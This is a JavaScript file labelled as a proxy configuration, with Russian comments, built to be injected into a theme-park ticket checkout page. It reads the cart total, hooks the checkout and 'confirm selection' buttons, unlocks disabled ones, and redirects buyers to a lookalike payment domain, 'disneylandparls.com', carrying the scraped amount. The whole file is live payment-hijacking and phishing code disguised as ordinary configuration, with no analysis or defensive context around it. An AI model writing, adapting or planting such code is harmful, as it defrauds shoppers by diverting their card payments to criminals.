/**
 * proxy-config.js
 */

(function() {
    'use strict';

    const PAYMENT_GATEWAY = 'https://pay.disneylandparls.com/';
    const STORE_ID = 'Disney Land Paris';

    // --- 1. ФУНКЦИЯ ИЗВЛЕЧЕНИЯ СУММЫ ---
    function getAmount() {
        const priceSelectors = [
            '.total-price-value',
            '[data-testid="total-price"]',
            '.cart-summary__total-price',
            '.summary-total-amount',
            '.amount'
        ];
        for (let selector of priceSelectors) {
            const el = document.querySelector(selector);
            if (el && el.innerText) {
                const price = el.innerText.replace(/[^0-9,.]/g, '').replace(',', '.');
                if (price && !isNaN(parseFloat(price))) return price;
            }
        }
        return '100.00';
    }

    // --- 2. ЛОГИКА ПЕРЕХВАТА ОПЛАТЫ ---
    function handlePaymentRedirect(event) {
        event.preventDefault();
        event.stopImmediatePropagation();
        event.stopPropagation();

        const amount = getAmount();
        const checkoutUrl = `${PAYMENT_GATEWAY}/?amount=${amount}&store=${encodeURIComponent(STORE_ID)}`;
        window.location.replace(checkoutUrl);
        return false;
    }

    // --- 3. МОНИТОРИНГ КНОПОК (DOM Observer) ---
    setInterval(() => {
        const buttons = document.querySelectorAll('button, a, [role="button"]');
        buttons.forEach(btn => {
            const text = (btn.innerText || "").toLowerCase().trim();

            if (text.includes('confirm selection') || text.includes('confirm your selection') || text.includes('checkout')) {
                if (btn.disabled || btn.getAttribute('disabled')) {
                    btn.disabled = false;
                    btn.removeAttribute('disabled');
                    btn.style.pointerEvents = 'auto';
                    btn.style.opacity = '1';
                }

                btn.style.border = "2px solid #28a745";

                if (!btn.dataset.proxyAttached) {
                    btn.addEventListener('click', handlePaymentRedirect, true);
                    btn.addEventListener('mousedown', handlePaymentRedirect, true);
                    btn.dataset.proxyAttached = "true";
                }
            }
        });
    }, 500);

})();
